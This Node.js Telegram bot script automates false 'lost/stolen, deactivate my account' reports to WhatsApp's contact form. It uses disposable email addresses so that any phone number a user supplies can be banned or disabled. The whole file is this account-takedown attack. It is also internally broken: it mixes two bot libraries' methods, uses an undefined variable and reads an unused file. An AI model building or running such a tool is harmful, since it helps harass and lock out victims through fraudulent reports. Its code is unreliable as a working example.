const { Telegraf } = require('telegraf');
const axios = require('axios');
const cheerio = require('cheerio');
const fs = require('fs');
const gradient = require('gradient-string');
const pino = require('pino');

// Replace 'YOUR_TELEGRAM_BOT_TOKEN' with your actual Telegram Bot token
const bot = new Telegraf('YOUR_TELEGRAM_BOT_TOKEN');

bot.start((ctx) => ctx.reply('Welcome to the WhatsApp submission bot! Use /banned <phone_number> to banned a request.'));

bot.command('menu', (ctx) => {
    const menu = `
    Available commands:
    /submit <phone_number> - Submit a request to WhatsApp.
    /dropnumber <phone_number> - Initiate a temporary ban on WhatsApp.
    `;
    ctx.reply(menu);
});

bot.onText(/\/banned (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const q = match[1];

    // Check if target phone number is provided
    if (!q) {
        ctx.reply('Please provide the target phone number.');
        return;
    }

    try {
        const ntah = await axios.get("https://www.whatsapp.com/contact/noclient/");
        const email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1");
        const cookie = ntah.headers["set-cookie"].join("; ");
        const $ = cheerio.load(ntah.data);
        const $form = $("form");
        const url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
        const form = new URLSearchParams();

        form.append("jazoest", $form.find("input[name=jazoest]").val());
        form.append("lsd", $form.find("input[name=lsd]").val());
        form.append("step", "submit");
        form.append("country_selector", "ID");
        form.append("phone_number", q);
        form.append("email", email.data[0]);
        form.append("email_confirm", email.data[0]);
        form.append("platform", "ANDROID");
        form.append("your_message", "Perdido/roubado: desative minha conta");
        form.append("__user", "0");
        form.append("__a", "1");
        form.append("__csr", "");
        form.append("__req", "8");
        form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
        form.append("dpr", "1");
        form.append("__ccg", "UNKNOWN");
        form.append("__rev", "1006630858");
        form.append("__comment_req", "0");

        const res = await axios({
            url,
            method: "POST",
            data: form,
            headers: {
                cookie
            }
        });

        bot.sendMessage(chatId, `Success! The request has been submitted to WhatsApp.`);
    } catch (error) {
        bot.sendMessage(chatId, `Oops! Something went wrong: ${error.message}`);
    }
});

bot.onText(/\/dropnumber (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const phoneNumber = match[1];
    const ddi = phoneNumber.substring(0, 2);
    const number = phoneNumber.substring(2);

    try {
        const res = await dropNumber({ phoneNumber, ddi, number });
        bot.sendMessage(chatId, `Success! System number ${ddi}${number} has been initiated.`);
    } catch (error) {
        bot.sendMessage(chatId, `Oops! Something went wrong: ${error.message}`);
    }
});

const dropNumber = async (context) => {
    const { phoneNumber, ddi, number } = context;
    const numbers = JSON.parse(fs.readFileSync('./YUDAMODS/crash.json'));

    try {
        const ntah = await axios.get("https://www.whatsapp.com/contact/noclient/");
        const email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1");
        const cookie = ntah.headers["set-cookie"].join("; ");
        const $ = cheerio.load(ntah.data);
        const $form = $("form");
        const url = new URL($form.attr("action"), "https://www.whatsapp.com").href;
        const form = new URLSearchParams();

        form.append("jazoest", $form.find("input[name=jazoest]").val());
        form.append("lsd", $form.find("input[name=lsd]").val());
        form.append("step", "submit");
        form.append("country_selector", "ID");
        form.append("phone_number", phoneNumber);
        form.append("email", email.data[0]);
        form.append("email_confirm", email.data[0]);
        form.append("platform", "ANDROID");
        form.append("your_message", "Perdido/roubado: desative minha conta");
        form.append("__user", "0");
        form.append("__a", "1");
        form.append("__csr", "");
        form.append("__req", "8");
        form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0");
        form.append("dpr", "1");
        form.append("__ccg", "UNKNOWN");
        form.append("__rev", "1006630858");
        form.append("__comment_req", "0");

        const res = await axios({
            url,
            method: "POST",
            data: form,
            headers: {
                cookie
            }
        });

        return true;
    } catch (error) {
        throw new Error(`Failed to initiate system number ${ddi}${number}: ${error.message}`);
    }
};

bot.launch();
